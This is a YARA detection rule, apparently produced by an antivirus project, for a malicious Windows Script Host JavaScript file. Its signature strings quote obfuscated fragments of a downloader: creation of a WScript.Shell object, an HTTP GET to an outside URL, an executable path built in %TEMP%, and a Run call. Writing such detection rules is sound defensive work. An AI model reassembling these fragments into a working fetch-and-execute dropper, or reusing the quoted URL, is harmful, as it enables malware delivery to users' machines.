rule sig_20160401_471410177b1f899aa7a1a9417bf78abe {
  meta:
    description = "datamaliciousorder - file 20160401_471410177b1f899aa7a1a9417bf78abe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "56665b1c8b2459d83e7689caf470c4b61dd6171e768ac5d6b5a032df7a43fba5"

  strings:
    $s1  = "function DqwGo(JfeKx, GuAs){CydNyr = CydNyr * 1; return JfeKx - GuAs;};" fullword ascii
    $s2  = "var OubTri = function HaHm() {return WScript[SqKqc](\"WScript\"+\".Shell\");}(), KeSk = 11;" fullword ascii
    $s3  = "if (AopGuh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "AopGuh[LkEl](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s5  = "function QbgJmo(){return GffBik + \"\";};" fullword ascii
    $s6  = "function LhRba() {return OubTri[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"PcLxaJA2kLZi.ex\" + \"e\";};" fullword ascii
    $s7  = "function GxJtw() {return ((ShgFcj == true) && (ShgFcj == BkmLqy)) ? 1 : CydNyr;};" fullword ascii
    $s8  = "ShgFcj = true; " fullword ascii
    $s9  = "function UguLyg(){return 23;};" fullword ascii
    $s10 = "}while (VdRv);" fullword ascii
    $s11 = "var PayIn = new this[\"Date\"]();" fullword ascii
    $s12 = "var RgiPhe = false;" fullword ascii
    $s13 = "function ZteZmu(KpRaz){OubTri[\"R\"+\"un\"](KpRaz, CydNyr, CydNyr);};" fullword ascii
    $s14 = "function VtyEdb()" fullword ascii
    $s15 = "function BoVg(){return SqKqc;};" fullword ascii
    $s16 = "var BkmLqy = false;" fullword ascii
    $s17 = "BkmLqy = true; " fullword ascii
    $s18 = "var ShgFcj = false;" fullword ascii
    $s19 = "return DqwGo(XpeHp, FaaKh);" fullword ascii
    $s20 = "function ZsxAo(YzqNuz) {var NtsLa = (1, 2, 3, 4, 5, YzqNuz); return NtsLa;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}